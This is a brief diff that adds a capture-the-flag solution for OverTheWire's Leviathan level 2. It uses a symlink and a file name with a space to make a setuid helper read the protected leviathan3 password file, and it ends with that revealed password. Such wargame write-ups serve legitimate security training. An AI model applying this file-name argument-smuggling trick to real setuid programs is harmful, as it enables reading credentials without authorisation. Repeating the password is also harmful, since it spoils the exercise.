@@ -1,0 +1,13 @@
+# ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+
+mkdir /tmp/mattlev
+cd /tmp/mattlev/
+
+touch "geese love"
+
+ln -s /etc/leviathan_pass/leviathan3 geese
+touch love
+
+~/printfile geese\ love
+
+>  Ahdiemoo1j
